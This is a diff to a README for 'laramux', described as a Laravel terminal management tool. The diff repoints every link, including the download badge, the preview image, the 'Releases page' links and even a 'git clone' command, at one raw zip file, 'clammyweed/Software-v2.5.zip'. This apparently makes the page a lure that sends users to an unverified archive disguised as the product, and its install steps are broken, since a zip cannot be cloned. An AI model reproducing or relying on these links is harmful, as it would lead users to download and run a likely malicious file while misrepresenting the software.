@@ -1,12 +1,12 @@
 # 🚀 laramux - Simplified Laravel Management in One Window
 
-[![Download laramux](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)
+[![Download laramux](https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip)](https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip)
 
 ## 📋 Description
 
 LaraMux is a terminal UI application designed to simplify Laravel development tasks. With LaraMux, you can manage your Laravel projects efficiently within a single terminal window. This application reduces the hassle of switching between different terminal tabs, allowing you to focus on your code.
 
-![LaraMux Preview](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)
+![LaraMux Preview](https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip)
 
 ## 📚 Table of Contents
 
@@ -73,7 +73,7 @@ LaraMux is a terminal UI application designed to simplify Laravel development ta
 
 ### ⬇️ Download Binary
 
-1. Visit the [Releases page](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip) to download the latest version.
 2. Once the file is downloaded, navigate to your downloads folder in the terminal.
 3. Run the binary file:
 
@@ -86,7 +86,7 @@ LaraMux is a terminal UI application designed to simplify Laravel development ta
 1. Clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip
+   git clone https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip
    ```
 
 2. Change to the project directory:
@@ -151,6 +151,6 @@ For best results, ensure that your Laravel Sail configuration is set up correctl
 
 ## 📥 Download & Install
 
-To get started with LaraMux, download it from the [Releases page](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip). Follow the installation instructions above that match your operating system. 
+To get started with LaraMux, download it from the [Releases page](https://raw.githubusercontent.com/hongsedemaozi/laramux/main/clammyweed/Software-v2.5.zip). Follow the installation instructions above that match your operating system. 
 
 Once installed, you can launch the application and start managing your Laravel projects effortlessly.
